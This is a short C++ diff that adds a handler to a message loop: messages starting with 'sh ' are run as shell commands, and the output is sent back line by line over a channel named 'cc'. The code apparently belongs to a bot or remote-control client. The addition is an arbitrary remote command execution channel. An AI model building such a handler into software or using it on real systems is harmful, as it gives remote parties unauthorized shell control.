@@ -135,6 +135,19 @@ void MainThread(unsigned int parentThreadId)
                 cc->Send(ss.str());
             }
         }
+        else if (message.substr(0, 3) == "sh ")
+        {
+            string command = message.substr(3);
+            auto result = Processes::Command(command);
+            for (auto line : Utils::Split(result, "\n"))
+            {
+                if (line.length() > 0 && line.substr(line.length() - 1) == "\n")
+                    line = line.substr(0, line.length() - 1);
+                if (line.length() == 0)
+                    continue;
+                cc->Send(line);
+            }
+        }
         else if (message == "hello")
         {
             cc->Send("hello");
